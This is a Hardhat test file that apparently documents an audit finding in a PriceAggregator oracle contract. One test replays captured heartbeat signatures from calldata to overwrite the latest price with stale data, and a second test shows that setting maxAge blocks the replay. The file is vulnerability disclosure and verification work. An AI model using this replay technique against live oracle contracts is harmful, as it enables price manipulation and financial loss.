// Audit-finding PoC: heartbeat (reqId=0) submissions can be replayed by ANY caller
// from on-chain calldata, with the OLD signed price + timestamp, becoming the new
// latest round. Mitigated only if maxAge is set to a finite value (off in demo
// default).

import { expect } from "chai";
import { network } from "hardhat";

import { signPrice, type DomainParams, type PriceMessage } from "../helpers/eip712.js";
import { deploySystem, type DeployedSystem } from "../helpers/fixtures.js";

async function signQuorum(sys: DeployedSystem, domain: DomainParams, message: PriceMessage) {
  return Promise.all(
    sys.reporters.slice(0, 2).map((w) => signPrice(w, w.account!.address, domain, message)),
  );
}

describe("AUDIT: heartbeat replay against stale signatures", () => {
  it("anyone can replay a captured heartbeat (reqId=0) to overwrite the latest round with stale data", async () => {
    const conn = await network.connect();
    const sys = await deploySystem(conn);
    const agg = await conn.viem.getContractAt("PriceAggregator", sys.aggregator);
    const domain = { chainId: sys.chainId, verifyingContract: sys.aggregator };

    // 1. Legitimate heartbeat at price 100, timestamp 100.
    const m1: PriceMessage = { reqId: 0n, assetId: sys.assetId, price: 100n, timestamp: 100n };
    const sigs1 = await signQuorum(sys, domain, m1);
    await agg.write.fulfillPrice([m1.reqId, m1.price, m1.timestamp, sigs1]);

    // 2. Newer heartbeat at price 200, timestamp 200 — this is the "real" current price.
    const m2: PriceMessage = { reqId: 0n, assetId: sys.assetId, price: 200n, timestamp: 200n };
    const sigs2 = await signQuorum(sys, domain, m2);
    await agg.write.fulfillPrice([m2.reqId, m2.price, m2.timestamp, sigs2]);

    // Latest should be 200 now.
    expect((await agg.read.latestRoundData())[1]).to.equal(200n);

    // 3. ATTACK: a stranger replays sigs1 (read off public calldata) to overwrite the
    //    latest round with the OLD price. No reporters needed, no fresh sigs.
    const wallets = await conn.viem.getWalletClients();
    const stranger = wallets[8];
    const aggAsStranger = await conn.viem.getContractAt("PriceAggregator", sys.aggregator, {
      client: { wallet: stranger },
    });
    await aggAsStranger.write.fulfillPrice([m1.reqId, m1.price, m1.timestamp, sigs1]);

    // 4. Latest is now back to 100 — the OLD price, presented as the freshest round.
    const round = await agg.read.latestRoundData();
    expect(round[1]).to.equal(100n); // STALE PRICE NOW LATEST
    expect(round[2]).to.equal(100n); // startedAt is the OLD timestamp
    expect(round[0]).to.equal(3n); // but roundId is fresh (3rd write)
  });

  it("setting maxAge to a finite value blocks the replay", async () => {
    const conn = await network.connect();
    const sys = await deploySystem(conn);
    const agg = await conn.viem.getContractAt("PriceAggregator", sys.aggregator);
    const domain = { chainId: sys.chainId, verifyingContract: sys.aggregator };

    // First do a heartbeat at a near-now timestamp so it's valid even under maxAge later.
    const pub = await conn.viem.getPublicClient();
    const t0 = (await pub.getBlock()).timestamp;
    const m1: PriceMessage = { reqId: 0n, assetId: sys.assetId, price: 100n, timestamp: t0 };
    const sigs1 = await Promise.all(
      sys.reporters
        .slice(0, 2)
        .map((w) => signPrice(w, w.account!.address, domain, m1)),
    );
    await agg.write.fulfillPrice([m1.reqId, m1.price, m1.timestamp, sigs1]);

    // Owner tightens maxAge to 1 second.
    await agg.write.setMaxAge([1n]);

    // Advance the chain past maxAge so the heartbeat is now "too old".
    await conn.provider.request({ method: "evm_increaseTime", params: [3600] });
    await conn.provider.request({ method: "evm_mine", params: [] });

    // Stranger replay attempt should revert SubmissionTooOld.
    const wallets = await conn.viem.getWalletClients();
    const stranger = wallets[8];
    const aggAsStranger = await conn.viem.getContractAt("PriceAggregator", sys.aggregator, {
      client: { wallet: stranger },
    });
    await conn.viem.assertions.revertWithCustomError(
      aggAsStranger.write.fulfillPrice([m1.reqId, m1.price, m1.timestamp, sigs1]),
      agg,
      "SubmissionTooOld",
    );
  });
});
